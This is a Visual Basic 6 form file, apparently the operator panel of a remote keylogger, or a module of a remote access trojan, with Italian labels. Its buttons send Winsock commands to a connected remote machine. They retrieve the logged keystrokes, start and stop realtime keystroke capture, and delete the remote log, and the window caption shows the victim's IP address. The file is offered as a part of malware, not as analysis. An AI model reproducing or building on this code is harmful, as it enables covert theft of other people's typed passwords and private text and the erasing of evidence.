VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "Comdlg32.ocx"
Begin VB.Form Form7 
   Caption         =   "KeYLoGGer Remoto Di:"
   ClientHeight    =   4815
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   8865
   LinkTopic       =   "Form7"
   ScaleHeight     =   4815
   ScaleWidth      =   8865
   StartUpPosition =   3  'Windows Default
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   960
      Top             =   4440
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Salva"
      Height          =   255
      Left            =   2880
      TabIndex        =   6
      Top             =   4440
      Width           =   2775
   End
   Begin VB.CommandButton Command4 
      Caption         =   "Cancella Log Remote"
      Height          =   255
      Left            =   6720
      TabIndex        =   4
      Top             =   3960
      Width           =   1935
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Stop Realtime"
      Height          =   255
      Left            =   4800
      TabIndex        =   3
      Top             =   3960
      Width           =   1215
   End
   Begin VB.CommandButton Command2 
      Caption         =   "RealTime"
      Height          =   255
      Left            =   2640
      TabIndex        =   2
      Top             =   3960
      Width           =   1335
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Visualizza Log Remote"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   3960
      Width           =   1935
   End
   Begin VB.TextBox Text1 
      Height          =   3255
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   480
      Width           =   8655
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Tasti Premuti"
      Height          =   195
      Left            =   240
      TabIndex        =   5
      Top             =   120
      Width           =   915
   End
End
Attribute VB_Name = "Form7"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "KTRECIVE"
End Sub

Private Sub Command2_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "KTRECIVEON"

End Sub

Private Sub Command3_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "KTRECIVEOFF"

End Sub

Private Sub Command4_Click()
Form1.Winsock1(Form1.Label14.Caption).SendData "del"

End Sub

Private Sub Form_Load()
Me.Caption = "KeYLoGGer Remoto Di: " & Form1.Winsock1(Form1.Label14.Caption).RemoteHostIP
End Sub
